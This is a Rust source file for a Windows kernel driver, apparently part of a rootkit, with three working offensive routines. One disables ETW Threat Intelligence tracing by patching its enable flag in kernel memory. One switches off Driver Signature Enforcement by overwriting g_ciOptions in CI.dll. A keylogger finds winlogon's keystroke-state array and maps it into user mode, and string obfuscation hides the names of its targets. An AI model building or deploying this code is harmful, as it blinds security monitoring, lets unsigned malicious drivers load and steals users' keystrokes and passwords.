use core::{ffi::c_void, ptr::null_mut, slice};
use obfstr::obfstr;
use wdk_sys::{
    _MEMORY_CACHING_TYPE::MmCached, _MM_PAGE_PRIORITY::NormalPagePriority, _MODE::UserMode, _MODE::KernelMode, _LOCK_OPERATION::IoReadAccess,
    ntddk::*, *,
};

use crate::{
    address::{get_function_address, get_module_base_address},
    attach::ProcessAttach,
    error::ShadowError,
    patterns::{ETWTI_PATTERN, scan_for_pattern, FULL_PATTERN, scan_for_pattern_masked},
    *,
};

/// Represents ETW (Event Tracing for Windows) in the operating system.
pub struct Etw;

impl Etw {
    /// Enables or disables ETW (Event Tracing for Windows) tracing by modifying the ETWTI structure.
    ///
    /// # Arguments
    ///
    /// * `enable` - A boolean flag indicating whether to enable (`true`) or disable (`false`) ETW tracing.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - If the operation is successful.
    /// * `Err(ShadowError)` - If any error occurs while finding the function or modifying the ETWTI structure.
    pub unsafe fn etwti_enable_disable(enable: bool) -> Result<NTSTATUS> {
        log::info!("etwti_enable_disable: {} ETWTI", if enable { "Enabling" } else { "Disabling" });
    
        // Convert the function name for lookup using the exported KeInsertQueueApc.
        let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();
        log::debug!("etwti_enable_disable: Function name (Unicode): {:?}", function_name);
    
        // Retrieve the system routine address.
        let function_address = MmGetSystemRoutineAddress(&mut function_name);
        if function_address.is_null() {
            log::error!("etwti_enable_disable: Failed to retrieve system routine address for KeInsertQueueApc");
            return Err(ShadowError::FunctionExecutionFailed("MmGetSystemRoutineAddress", line!()));
        }
        log::info!("etwti_enable_disable: Retrieved system routine address: {:p}", function_address);
        const MOV_PATTERN: [u8; 7] = [0x4C, 0x8B, 0x15, 0, 0, 0, 0]; // last 4 bytes are wildcards
        const MOV_MASK: &str = "xxx????";
    
        // Scan a reasonable memory region for the pattern.
        let etwti_handle = scan_for_pattern_masked(
            function_address,
            &MOV_PATTERN,
            MOV_MASK,
            3,  // offset into the instruction where the 4-byte displacement is located
            7,  // final adjustment: the mov instruction is 7 bytes long
            0x1000, // scan size (adjust if needed)
        )?;
        log::info!("Computed ETWTI base address at: {:p}", etwti_handle);
    
        // Calculate the TRACE_ENABLE_INFO structure address by applying known offsets.
        // These offsets (0x20 and 0x60) are derived from reverse engineering.
        let trace_info = etwti_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
        if (*trace_info).IsEnabled != 0 && (*trace_info).IsEnabled != 1 {
                 return Err(ShadowError::InvalidMemory);
             }
        
        log::info!("etwti_enable_disable: TRACE_ENABLE_INFO located at: {:p}", trace_info);
        let new_state = if enable { 0x01 } else { 0x00 };
    
        (*trace_info).IsEnabled = new_state;
        log::info!("etwti_enable_disable: Set TRACE_ENABLE_INFO::IsEnabled to {:#x}", new_state);
    
        log::info!("etwti_enable_disable: Operation successful");
        Ok(STATUS_SUCCESS)
    }
    
    
    
}

/// Represents Driver Signature Enforcement (DSE) in the operating system.
pub struct Dse;

impl Dse {
    /// Modifies the Driver Signature Enforcement (DSE) state.
    ///
    /// # Arguments
    ///
    /// * `enable` - A boolean flag indicating whether to enable (`true`) or disable (`false`) driver signature enforcement.
    ///
    /// # Returns
    ///
    /// * `Ok(NTSTATUS)` - If the operation is successful.
    /// * `Err(ShadowError)` - If the function fails to find or modify the DSE state.
    pub unsafe fn set_dse_state(enable: bool) -> Result<NTSTATUS> {
        // Get the base address of the CI.dll module, where the relevant function resides
        let module_address = get_module_base_address(obfstr!("CI.dll"))?;

        // Get the address of the CiInitialize function within CI.dll
        let function_address = get_function_address(obfstr!("CiInitialize"), module_address)?;

        // Search for the memory pattern that represents the initialization of DSE
        let instructions = [0x8B, 0xCD];
        let c_ip_initialize = scan_for_pattern(function_address, &instructions, 3, 7, 0x89)?;

        // Locate the g_ciOptions structure based on a pattern in the CiInitialize function
        let instructions = [0x49, 0x8b, 0xE9];
        let g_ci_options = scan_for_pattern(c_ip_initialize.cast(), &instructions, 5, 9, 0x21)?;

        // Modify g_ciOptions to either enable or disable DSE based on the input flag
        if enable {
            *(g_ci_options as *mut u64) = 0x0006_u64;
        } else {
            *(g_ci_options as *mut u64) = 0x000E_u64;
        }

        Ok(STATUS_SUCCESS)
    }
}

/// Represents keylogger operations in the system.
pub struct Keylogger;

impl Keylogger {
    /// Retrieves the address of the `gafAsyncKeyState` array in the `winlogon.exe` process and maps it to user-mode.
    ///
    /// # Returns
    ///
    /// * `Ok(*mut c_void)` - If successful, returns a pointer to the mapped user-mode address of `gafAsyncKeyState`.
    /// * `Err(ShadowError)` - If any error occurs while finding the address or mapping memory.
    pub unsafe fn get_user_address_keylogger() -> Result<*mut c_void> {
        // 1. Get the PID of winlogon.exe
        let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
        
        // 2. Attach to the winlogon.exe process (ensuring we are in the proper session)
        let winlogon_process = Process::new(pid)?;
        let _attach_guard = ProcessAttach::new(winlogon_process.e_process);
        
        // 3. Retrieve the session globals address (which points to gSessionGlobalSlots or gafAsyncKeyState)
        let session_globals_address = Self::get_session_globals_address()?;
        log::info!("get_user_address_keylogger: Retrieved session globals at {:p}", session_globals_address);
        
        // 4. Allocate an MDL for the region (adjust the size as needed – here we use 64 bytes as an example)
        let mdl = IoAllocateMdl(
            session_globals_address.cast(),
            core::mem::size_of::<[u8; 64]>() as u32,
            0,
            0,
            null_mut(),
        );
        if mdl.is_null() {
            return Err(ShadowError::FunctionExecutionFailed("IoAllocateMdl", line!()));
        }
        
        // 5. Lock the pages via MmProbeAndLockPages (instead of MmBuildMdlForNonPagedPool)
        //    This call will lock the pages in memory so they can be mapped safely.
        MmProbeAndLockPages(mdl, KernelMode as i8, IoReadAccess);
        
        // 6. Map the locked pages into user-mode address space using MmMapLockedPagesSpecifyCache.
        let address = MmMapLockedPagesSpecifyCache(
            mdl,
            UserMode as i8,
            MmCached,
            null_mut(),
            0,
            NormalPagePriority as u32,
        );
        if address.is_null() {
            IoFreeMdl(mdl);
            return Err(ShadowError::FunctionExecutionFailed("MmMapLockedPagesSpecifyCache", line!()));
        }
        
        // The returned address can now be polled in user-mode for keystroke data without crossing back into the kernel.
        Ok(address)
    }
    
    /// Retrieves the address of the session globals (gSessionGlobalSlots on Windows 11 or gafAsyncKeyState on Windows 10).
    /// This function locates the target by scanning for the "mov rax, [rip+imm32]" opcode in the exported W32GetSessionState function.
    pub unsafe fn get_session_globals_address() -> Result<*mut u8> {
        // Define the pattern and mask for the gSessionGlobalSlots thunk.
        // We choose a sequence covering:
        //   0: B0 7E           ; mov al,7Eh
        //   2: 2D A6 0E D2 FF  ; sub eax, 0FFD20EA6h
        //   7: FF 90           ; call qword ptr [rax+imm32] (first two bytes of the opcode)
        //   9: 7E 2D A6 0E     ; the 4-byte displacement which is dynamic -> mark as wildcards
        //  13: D2 FF           ; sar bh, cl
        const GSESSION_GLOBAL_SLOTS_PATTERN: [u8; 15] = [
            0xB0, 0x7E,             // mov al, 7Eh
            0x2D, 0xA6, 0x0E, 0xD2, 0xFF, // sub eax, 0FFD20EA6h
            0xFF, 0x90,             // call qword ptr [rax+imm32] (call opcode)
            0x7E, 0x2D, 0xA6, 0x0E,  // relative displacement (wildcard)
            0xD2, 0xFF              // sar bh, cl
        ];
        // The mask: fixed bytes for all except the 4 bytes of the displacement.
        // "x" = match exactly, "?" = wildcard.
        const GSESSION_GLOBAL_SLOTS_MASK: &str = "xxxxxxxxx????xx";
    
        // 1. Get the base address of the module.
        //    Here we're using "win32k.sys" but adjust this if necessary.
        let module_address = get_module_base_address(obfstr!("win32k.sys"))?;
    
        // 2. Try to resolve the symbol "gSessionGlobalSlots" via your symbol lookup.
        let mut slots_symbol_addr = get_function_address(obfstr!("gSessionGlobalSlots"), module_address)
            .unwrap_or(core::ptr::null_mut());
    
        // 3. If the lookup failed, fall back to a pattern scan in a reasonable memory region.
        if slots_symbol_addr.is_null() {
            // For example, scan the first 0x10000 bytes of the module.
            slots_symbol_addr = scan_for_pattern_masked(
                module_address,
                &GSESSION_GLOBAL_SLOTS_PATTERN,
                GSESSION_GLOBAL_SLOTS_MASK,
                0, // no additional offset
                0, // no final adjustment
                0x10000, // scan size (adjust as needed)
            )? as *mut c_void;
            
        }
        if slots_symbol_addr.is_null() {
            return Err(ShadowError::PatternNotFound);
        }
    
        // 4. Since gSessionGlobalSlots is a thunk (code) that returns a pointer to the array,
        //    cast its address to a function pointer type and call it.
        type GSessionGlobalSlotsFn = unsafe extern "system" fn() -> *mut *mut u8;
        let get_slots: GSessionGlobalSlotsFn = core::mem::transmute(slots_symbol_addr);
        let slots_array_ptr = get_slots();
    
        // 5. Retrieve the current session ID.
        //    First try to resolve W32GetCurrentWin32kSessionId via your symbol lookup.
        let wk_module = get_module_base_address(obfstr!("win32kbase.sys"))?;
        let mut session_id_addr = get_function_address(obfstr!("W32GetCurrentWin32kSessionId"), wk_module)
            .unwrap_or(core::ptr::null_mut());
        // Fallback: if not found, attempt to use MmGetSystemRoutineAddress.
        if session_id_addr.is_null() {
            let mut session_fn_unicode = uni::str_to_unicode(obfstr!("W32GetCurrentWin32kSessionId")).to_unicode();
            session_id_addr = MmGetSystemRoutineAddress(&mut session_fn_unicode);
        }
        if session_id_addr.is_null() {
            return Err(ShadowError::PatternNotFound);
        }
        type W32GetCurrentWin32kSessionIdFn = unsafe extern "system" fn() -> u32;
        let get_session_id: W32GetCurrentWin32kSessionIdFn = core::mem::transmute(session_id_addr);
        let session_id = get_session_id();
        log::info!("get_session_globals_address: Current session ID: {}", session_id);
    
        // 6. Index into the global array (returned by the thunk) to get the key state array for the current session.
        let target_address = *slots_array_ptr.add(session_id as usize);
        log::info!("get_session_globals_address: Found session globals at {:p}", target_address);
    
        Ok(target_address)
    }
    
    
    
    
}
